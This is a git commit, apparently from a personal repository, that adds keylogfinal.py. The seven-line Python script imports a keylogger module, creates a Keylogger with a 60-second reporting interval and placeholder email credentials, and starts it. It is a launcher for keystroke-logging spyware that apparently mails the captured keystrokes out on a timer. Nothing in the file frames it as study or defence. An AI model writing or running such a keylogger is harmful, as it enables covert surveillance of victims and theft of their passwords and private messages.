c10a050eb35d207b643e1c335dfd5bb9a328bd83
False_God <67223332+sensation-git@users.noreply.github.com>
2022-03-04 16:12:38 +0530

    Add files via upload

---
+++ keylogfinal.py
@@ -0,0 +1,7 @@
+import keylogger
+
+my_keylogger = keylogger.Keylogger(60, "your_email", "password") #here 60 is 60 seconds(you can change it according to your prefrence)
+
+my_keylogger.start()
+
+#False_God
